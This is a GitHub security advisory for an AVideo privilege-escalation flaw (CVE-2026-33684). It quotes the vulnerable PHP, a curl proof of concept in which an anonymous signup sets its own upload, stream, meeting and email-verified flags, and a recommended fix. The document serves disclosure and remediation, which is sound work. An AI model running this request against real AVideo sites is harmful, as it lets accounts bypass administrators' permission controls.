# [M] AVideo's Privilege Escalation via Unguarded Permission Parameters in signUp API Allows Self-Granting Upload/Stream/Meet Permissions

## Summary
Severity: Medium
Advisory: GHSA-8j8m-p79x-g4jm
CVE: CVE-2026-33684
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-8j8m-p79x-g4jm
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0 <29.0

## Details
## Summary

The `set_api_signUp` method in the API plugin accepts `emailVerified`, `canUpload`, `canStream`, and `canCreateMeet` parameters from user-supplied input and applies them to newly created accounts without verifying that the request was authenticated with a valid APISecret. Any anonymous user who can solve a CAPTCHA can self-grant elevated permissions during account registration.

## Details

The authentication check in `set_api_signUp` (`plugin/API/API.php:4222`) allows either a valid APISecret (admin-level credential) or a solved CAPTCHA (anonymous access):

```php
// plugin/API/API.php:4222-4232
if ($obj->APISecret !== @$_REQUEST['APISecret']) {
    if(empty($_REQUEST['captcha'])){
        return new ApiObject("Captcha is required");
    }
    require_once $global['systemRootPath'] . 'objects/captcha.php';
    $valid = Captcha::validation($_REQUEST['captcha']);
    if(!$valid){
        return new ApiObject("Captcha is wrong, reload it and try again");
    }
}
```

After this check, both code paths (APISecret and CAPTCHA) reach the privilege parameter handling unconditionally:

```php
// plugin/API/API.php:4238-4249
if (isset($_REQUEST['emailVerified'])) {
    $global['emailVerified'] = intval($_REQUEST['emailVerified']);
}
if (isset($_REQUEST['canCreateMeet'])) {
    $global['canCreateMeet'] = intval($_REQUEST['canCreateMeet']);
}
if (isset($_REQUEST['canStream'])) {
    $global['canStream'] = intval($_REQUEST['canStream']);
}
if (isset($_REQUEST['canUpload'])) {
    $global['canUpload'] = intval($_REQUEST['canUpload']);
}
```

These `$global` values are then consumed by `User::save()` (`objects/user.php:829-840`), which overrides the user object's permission fields:

```php
// objects/user.php:829-840
if (isset($global['emailVerified'])) {
    $this->emailVerified = $global['emailVerified'];
}
if (isset($global['canCreateMeet'])) {
    $this->canCreateMeet = $global['canCreateMeet'];
}
if (isset($global['canStream'])) {
    $this->canStream = $global['canStream'];
}
if (isset($global['canUpload'])) {
    $this->canUpload = $global['canUpload'];
}
```

Note that even though `userCreate.json.php:90` sets `canUpload` from the site's default configuration, `User::save()` subsequently overrides it with the attacker-controlled `$global` value.

The codebase already uses `self::isAPISecretValid()` to guard admin-only operations in other API methods (e.g., lines 294, 991, 1664, 2150), but this check is missing for the privilege parameters in `set_api_signUp`.

## PoC

```bash
# Step 1: Get a CAPTCHA token
# (Navigate to the signup page in a browser, solve the CAPTCHA, capture the token)

# Step 2: Register with elevated privileges
curl -X POST 'https://target/plugin/API/set.json.php' \
  -d 'APIName=signUp' \
  -d 'user=attacker' \
  -d 'pass=Password123!' \
  -d 'email=attacker@example.com' \
  -d 'name=Attacker' \
  -d 'captcha=VALID_CAPTCHA_TOKEN' \
  -d 'emailVerified=1' \
  -d 'canUpload=1' \
  -d 'canStream=1' \
  -d 'canCreateMeet=1'

# Expected: Account created with default (restricted) permissions
# Actual: Account created with upload, stream, and meet permissions enabled,
#         plus email marked as verified

# Step 3: Verify elevated permissions by logging in and checking profile
curl -X POST 'https://target/plugin/API/set.json.php' \
  -d 'APIName=signIn' \
  -d 'user=attacker' \
  -d 'pass=Password123!'
# Response will show canUpload=1, canStream=1, canCreateMeet=1, emailVerified=1
```

## Impact

- **Email verification bypass:** Attackers can mark their accounts as email-verified without owning the email address, bypassing any email-gated functionality
- **Unauthorized upload access:** Self-granted upload permissions allow uploading potentially malicious video content to the platform
- **Unauthorized streaming access:** Self-granted streaming permissions allow unauthorized live streaming
- **Unauthorized meeting creation:** Self-granted meet permissions allow creating meetings on the platform
- **Policy bypass:** Platform administrators who intentionally restrict these permissions for new users (e.g., requiring manual approval before granting upload rights) have their access controls circumvented

## Recommended Fix

Wrap the privilege parameter handling in an `isAPISecretValid()` check so that only admin-authenticated requests can set these values:

```php
// plugin/API/API.php — replace lines 4238-4249 with:
if (self::isAPISecretValid()) {
    if (isset($_REQUEST['emailVerified'])) {
        $global['emailVerified'] = intval($_REQUEST['emailVerified']);
    }
    if (isset($_REQUEST['canCreateMeet'])) {
        $global['canCreateMeet'] = intval($_REQUEST['canCreateMeet']);
    }
    if (isset($_REQUEST['canStream'])) {
        $global['canStream'] = intval($_REQUEST['canStream']);
    }
    if (isset($_REQUEST['canUpload'])) {
        $global['canUpload'] = intval($_REQUEST['canUpload']);
    }
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-8j8m-p79x-g4jm
- https://github.com/WWBN/AVideo/commit/061f242cba0e068cc1b461705fe839274b5038ff
- https://github.com/WWBN/AVideo
